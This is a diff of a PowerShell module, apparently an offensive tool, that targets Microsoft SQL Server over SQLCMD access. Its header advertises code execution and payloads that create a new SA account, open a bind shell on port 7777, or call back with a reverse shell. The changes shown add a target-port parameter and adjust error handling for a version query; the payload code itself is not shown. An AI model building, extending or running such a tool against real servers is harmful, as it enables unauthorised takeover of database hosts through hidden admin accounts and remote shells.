@@ -1,10 +1,11 @@
 <#
 .SYNOPSIS
-  InvokeWPS-SQLCMD.psm1
+  Invoke-SQLCMD.psm1
 .DESCRIPTION
   Simply built to pop code execution with basic SQL cmd access
 .PARAMETER 
   $RHost            = sets the target address (this can be localhost or the remote IP depending ont he situation)
+  $RPort            = sets the target port. often will be 1433
   $CreateNewSA      = payload after connecting will be: a new SA account
   $PopBindShell     = payload after connecting will be: A Binded Shell located $RHOST:7777
   $PopReverseShell  = payload after connecting will be: A Bind Shell calling back to $LPORT:7777 (tba)
@@ -20,7 +21,7 @@
   
 .EXAMPLE
   PS:/> Import-Module Invoke-SQLCMD.psm1
-  PS:/> InvokeWPS-SQLCMD -RHost 10.1.1.1 -CreateNewSA
+  PS:/> Invoke-SQLCMD -RHost 10.1.1.1 -Rport 1433 -CreateNewSA
 #>
 
 
@@ -30,6 +31,9 @@ Function Global:InvokeWPS-SQLCMD(){
     (
         [Parameter(Mandatory)]
         [String] $RHost,
+
+        [Parameter(Mandatory)]
+        [Int]    $RPort = 1433,
 
         [Switch] $CreateNewSA,
         [Switch] $PopBindShell,
@@ -87,16 +91,19 @@ Function Global:InvokeWPS-SQLCMD(){
     }
     else
     {
-        Write-Host "[WPS] No Payload parametres selected, performing general enumeration." -ForegroundColor Green
+        Write-Host "[WPS] No Payload parametres selected, Attempting simple test version query" -ForegroundColor Green
         try
         {
-            $result = Invoke-Sqlcmd -ServerInstance $RHost -Query "@@version" -ErrorAction stop
-            $result
+            Invoke-Sqlcmd -ServerInstance $RHost -Query "@@version" -ErrorAction Stop 
+        }
+        catch [ManagedBatchParser.ParserException]
+        {
+            Write-Host "[WPS] ERROR: Permission/Connectivity issue." -ForegroundColor DarkRed
         }
         catch
         {
-            Write-Host "[WPS] ERROR response below "
-            $result
+            Write-Host "[WPS] ERROR: Unkown generic error when attempting to send SQLCMD command: '@@Version'" -ForegroundColor DarkRed
         }
+
     }
 }
